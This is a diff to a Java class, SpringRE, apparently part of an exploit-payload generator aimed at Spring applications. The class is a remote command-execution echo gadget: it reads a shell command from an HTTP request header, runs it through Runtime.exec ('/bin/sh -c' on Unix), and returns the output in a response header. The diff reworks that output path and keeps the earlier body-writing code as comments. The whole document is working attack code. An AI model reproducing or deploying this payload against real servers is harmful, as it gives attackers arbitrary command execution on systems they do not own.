@@ -16,7 +16,7 @@ import java.lang.reflect.Method;
  */
 @Middleware(Middleware.Spring)
 @JavaClassType(JavaClassType.Default)
-@JavaClassModifiable({JavaClassModifiable.HEADER})
+@JavaClassModifiable({JavaClassModifiable.HEADER, JavaClassModifiable.RHEADER})
 public class SpringRE {
     public static String HEADER;
 
@@ -27,18 +27,20 @@ public class SpringRE {
 
             Object request = invokeMethod(object, "getRequest", new Class[]{}, new Object[]{});
             Object response = invokeMethod(object, "getResponse", new Class[]{}, new Object[]{});
-            Object header = invokeMethod(request, "getHeader", new Class[]{String.class}, new Object[]{HEADER});
-            String result = exec((String) header);
+            String header = (String) invokeMethod(request, "getHeader", new Class[]{String.class}, new Object[]{HEADER});
+            if (header != null && !header.isEmpty()) {
+                String result = exec(header);
+                // 输出到头
+                invokeMethod(response, "addHeader", new Class[]{String.class, String.class}, new Object[]{HEADER, result});
 
-            // 输出到头
-            invokeMethod(response, "addHeader", new Class[]{String.class, String.class}, new Object[]{HEADER, result});
+//                invokeMethod(response, "setStatus", new Class[]{Integer.TYPE}, new Object[]{new Integer(200)});
+//                // 有 shiro 情况不一样了
+//                Object writer = invokeMethod(Class.forName("javax.servlet.ServletResponse"), response, "getWriter", new Class[]{}, new Object[]{});
+//                writer.getClass().getDeclaredMethod("println", String.class).invoke(writer, result);
+//                writer.getClass().getDeclaredMethod("flush").invoke(writer);
+//                writer.getClass().getDeclaredMethod("close").invoke(writer);
+            }
 
-            invokeMethod(response, "setStatus", new Class[]{Integer.TYPE}, new Object[]{new Integer(200)});
-            // 有 shiro 情况不一样了
-            Object writer = invokeMethod(Class.forName("javax.servlet.ServletResponse"), response, "getWriter", new Class[]{}, new Object[]{});
-            writer.getClass().getDeclaredMethod("println", String.class).invoke(writer, result);
-            writer.getClass().getDeclaredMethod("flush").invoke(writer);
-            writer.getClass().getDeclaredMethod("close").invoke(writer);
         } catch (Exception e) {
 
         }
@@ -52,10 +54,8 @@ public class SpringRE {
             cmd = new String[]{"/bin/sh", "-c", str};
         }
         InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream();
-        return exec_result(inputStream);
-    }
 
-    public static String exec_result(InputStream inputStream) throws Exception {
+        // result
         byte[] bytes = new byte[1024];
         int len;
         StringBuilder stringBuilder = new StringBuilder();
@@ -65,7 +65,7 @@ public class SpringRE {
         return stringBuilder.toString();
     }
 
-    public static Object invokeMethod(Class cls, Object obj, String methodName, Class[] argsClass, Object[] args) throws Exception{
+    public static Object invokeMethod(Class cls, Object obj, String methodName, Class[] argsClass, Object[] args) throws Exception {
         Method method = cls.getDeclaredMethod(methodName, argsClass);
         method.setAccessible(true);
         Object object = method.invoke(obj, args);
